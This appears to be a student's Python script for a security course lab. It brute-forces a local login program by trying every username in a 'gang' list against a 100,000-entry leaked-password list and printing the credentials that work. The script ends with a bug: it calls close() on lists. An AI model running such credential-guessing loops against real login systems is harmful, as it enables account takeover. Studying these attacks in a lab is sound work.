import time
import threading
import subprocess


start = time.time()
gang = open(r"C:\Users\sigde\OneDrive\Desktop\UConn CSE\CSE 3140\lab1\Q3\gang.txt", "r", encoding="utf8").read().split("\n")
passwords = open(r"C:\Users\sigde\OneDrive\Desktop\UConn CSE\CSE 3140\lab1\Q3\PwnedPWs100k.txt", "r", encoding="utf8").read().split("\n")


def pwned(gang, passwords):
  for i in gang:
    for j in passwords:
      command = subprocess.run(["python3", "Login.pyc", i, j], capture_output = True, text=True)
      if "success" in command.stdout:
        print("Cracked username " + i)
        print("Cracked password " + j)


t = threading.Thread(target=pwned, args=(gang, passwords))
t.start()
t.join()
end = time.time() - start
print(end)
gang.close()
passwords.close()
